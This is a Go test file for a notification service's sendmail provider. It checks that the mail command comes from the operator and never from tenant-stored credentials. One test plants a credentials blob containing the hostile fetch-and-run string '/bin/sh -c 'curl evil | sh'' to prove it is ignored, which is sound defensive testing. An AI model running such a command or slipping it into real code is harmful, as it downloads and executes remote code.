package connectivity

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/danmestas/notify/internal/domain"
	"github.com/danmestas/notify/internal/providers/sendmail"
)

// TestCreateSendmail_ThenResolveEmail: the resolved provider carries the
// OPERATOR's command and the TENANT's from, and nothing else crosses over.
func TestCreateSendmail_ThenResolveEmail(t *testing.T) {
	ctx := context.Background()
	argv := []string{"/opt/mta/bin/sendmail", "-ti", "-oi"}
	svc := New(openTemp(t), testKey(), WithSendmailCommand(argv))
	scope := domain.Scope{OrgID: "o1", EnvID: "e1"}

	if _, err := svc.CreateSendmail(ctx, scope, "local-mta", SendmailConfig{From: "forge@example.org"}, true); err != nil {
		t.Fatalf("CreateSendmail: %v", err)
	}

	prov, from, providerID, _, err := svc.ResolveEmail(ctx, scope)
	if err != nil {
		t.Fatalf("ResolveEmail: %v", err)
	}
	if providerID != "sendmail" || from != "forge@example.org" {
		t.Fatalf("providerID=%q from=%q", providerID, from)
	}
	c, ok := prov.(*sendmail.Client)
	if !ok {
		t.Fatalf("provider type = %T, want *sendmail.Client", prov)
	}
	if strings.Join(c.Command, " ") != strings.Join(argv, " ") {
		t.Errorf("Command = %v, want the operator's %v", c.Command, argv)
	}
	if c.From != "forge@example.org" {
		t.Errorf("From = %q", c.From)
	}
}

// TestSendmailCommand_IsNotTenantData is the security property: the stored
// integration holds only "from". Even a hand-crafted credentials blob carrying
// a "command" key is ignored, so no API path -- present or future -- can turn
// an integration into an arbitrary exec.
func TestSendmailCommand_IsNotTenantData(t *testing.T) {
	ctx := context.Background()
	svc := New(openTemp(t), testKey(), WithSendmailCommand([]string{"/usr/sbin/sendmail", "-ti"}))
	scope := domain.Scope{OrgID: "o1", EnvID: "e1"}

	// Bypass CreateSendmail and plant a blob with a command in it.
	enc, err := svc.encrypt([]byte(`{"from":"f@e.org","command":"/bin/sh -c 'curl evil | sh'"}`))
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	if _, err := svc.createIntegration(ctx, scope, domain.Integration{
		ProviderID: "sendmail", Channel: "email", EncCredentials: enc, Active: true, Primary: true, Identifier: "planted",
	}); err != nil {
		t.Fatalf("createIntegration: %v", err)
	}

	prov, _, _, _, err := svc.ResolveEmail(ctx, scope)
	if err != nil {
		t.Fatalf("ResolveEmail: %v", err)
	}
	c := prov.(*sendmail.Client)
	if strings.Contains(strings.Join(c.Command, " "), "curl") {
		t.Fatalf("a command stored in the credentials blob reached the provider: %v", c.Command)
	}
	if c.Command[0] != "/usr/sbin/sendmail" {
		t.Fatalf("Command = %v, want the operator's", c.Command)
	}
}

// TestSendmailCommand_DefaultWhenUnset: no option means the provider default,
// never an empty argv that would fail at send time.
func TestSendmailCommand_DefaultWhenUnset(t *testing.T) {
	svc := New(openTemp(t), testKey())
	if got := svc.SendmailCommand(); strings.Join(got, " ") != strings.Join(sendmail.DefaultCommand, " ") {
		t.Fatalf("SendmailCommand() = %v, want default %v", got, sendmail.DefaultCommand)
	}
}

// TestVerifyByID_Sendmail: verify reports whether the operator's command can
// be found, without running it.
func TestVerifyByID_Sendmail(t *testing.T) {
	ctx := context.Background()
	scope := domain.Scope{OrgID: "o1", EnvID: "e1"}

	dir := t.TempDir()
	present := filepath.Join(dir, "sendmail")
	if err := os.WriteFile(present, []byte("#!/bin/sh\nexit 0\n"), 0o755); err != nil {
		t.Fatalf("write: %v", err)
	}

	for _, tc := range []struct {
		name   string
		argv   []string
		wantOK bool
		wantIn string
	}{
		{"present and executable", []string{present, "-ti"}, true, present},
		{"missing binary", []string{filepath.Join(dir, "absent"), "-ti"}, false, "not found"},
		{"empty argv", nil, true, "sendmail"}, // falls back to the default; OK depends on the host
	} {
		t.Run(tc.name, func(t *testing.T) {
			svc := New(openTemp(t), testKey(), WithSendmailCommand(tc.argv))
			in, err := svc.CreateSendmail(ctx, scope, "mta", SendmailConfig{From: "f@e.org"}, true)
			if err != nil {
				t.Fatalf("CreateSendmail: %v", err)
			}
			res, err := svc.VerifyByID(ctx, scope, in.ID)
			if err != nil {
				t.Fatalf("VerifyByID: %v", err)
			}
			if res.ProviderID != "sendmail" {
				t.Errorf("ProviderID = %q", res.ProviderID)
			}
			if tc.argv != nil && res.OK != tc.wantOK {
				t.Errorf("OK = %v, want %v (detail: %s)", res.OK, tc.wantOK, res.Detail)
			}
			if !strings.Contains(res.Detail, tc.wantIn) {
				t.Errorf("Detail %q does not mention %q", res.Detail, tc.wantIn)
			}
		})
	}
}
